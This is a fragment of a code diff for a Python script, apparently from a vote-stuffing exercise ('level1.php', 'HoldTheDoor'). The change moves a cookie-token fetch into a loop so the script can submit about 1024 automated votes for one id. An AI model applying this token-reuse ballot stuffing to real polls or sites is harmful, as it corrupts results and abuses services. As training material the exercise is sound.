@@ -4,9 +4,9 @@ import requests
 
 
 url = "http://158.69.76.135/level1.php"
-response = requests.get(url)
 votos = 0
-while votos <= 50:
+while votos < 1024:
+    response = requests.get(url)
     key_HoldTheDoor = response.cookies["HoldTheDoor"]
     params = {'id': '1729', 'holdthedoor': 'submit', 'key': key_HoldTheDoor}
     cookies_hodor = {"HoldTheDoor": key_HoldTheDoor}
